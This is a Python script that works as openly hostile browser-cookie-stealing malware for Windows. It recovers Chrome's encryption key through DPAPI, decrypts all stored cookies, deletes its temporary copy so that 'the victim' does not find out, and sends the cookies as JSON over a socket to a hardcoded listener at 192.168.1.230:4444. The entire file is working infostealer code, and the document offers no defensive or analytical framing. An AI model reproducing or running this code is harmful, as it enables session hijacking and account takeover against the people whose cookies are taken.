import os
from pathlib import Path
import json
import base64
import win32crypt
import shutil
import sqlite3
from Cryptodome.Cipher import AES
import datetime
import socket

# Init variables
IP = '192.168.1.230'
PORT = 4444

appdata_local = Path(os.environ["LOCALAPPDATA"])
chrome_local_state_path = appdata_local / "Google" / "Chrome" / "User Data" / "Local State"
chrome_cookies_path = appdata_local / "Google" / "Chrome" / "User Data" / "Default" / "Network" / "Cookies"

# Get chrome encrypted key (encryption key)
with open(chrome_local_state_path, 'r', encoding='utf-8') as f:
    chrome_local_state = json.load(f)

encrypted_key = chrome_local_state["os_crypt"]["encrypted_key"]
encrypted_key = base64.b64decode(encrypted_key.encode("utf-8"))
encrypted_key = encrypted_key[5:]
key = win32crypt.CryptUnprotectData(encrypted_key)

# Find and decrypt chrome cookies
temp_cookies_db = appdata_local / "Google" / "Chrome" / "User Data" / "Default" / "Network" / "TempCookies"
shutil.copy2(chrome_cookies_path, temp_cookies_db)
conn = sqlite3.connect(temp_cookies_db)
cursor = conn.cursor()
cursor.execute("SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies")

cookies_data = cursor.fetchall()
decrypted_cookies = []

for cookie in cookies_data:
    name, value, host_key, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value = cookie
    decrypted_value = None
    
    if encrypted_value:
        try:
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            cipher = AES.new(key[1], AES.MODE_GCM, nonce=nonce)
            decrypted_bytes = cipher.decrypt(ciphertext)
            
            try:
                decrypted_value = decrypted_bytes.decode('utf-8')
            except UnicodeDecodeError:
                decrypted_value = base64.b64encode(decrypted_bytes).decode('ascii')
                
        except Exception:
            decrypted_value = value
    else:
        decrypted_value = value
    
    # Convert datetime to an ISO 8601 string for JSON compatibility
    expires_dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=expires_utc)
    
    decrypted_cookies.append({
        "name": name,
        "value": decrypted_value,
        "host_key": host_key,
        "path": path,
        "expires_utc": expires_dt.isoformat(),
        "is_secure": bool(is_secure),
        "is_httponly": bool(is_httponly),
        "samesite": samesite
    })

conn.close()
os.remove(temp_cookies_db) # Cant have the victim finding out can we?

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP, PORT))
    
    # Serialize the list of dictionaries to a JSON formatted string
    json_data = json.dumps(decrypted_cookies, indent=2)
    
    # Encode the JSON string to bytes and send it
    s.sendall(json_data.encode('utf-8'))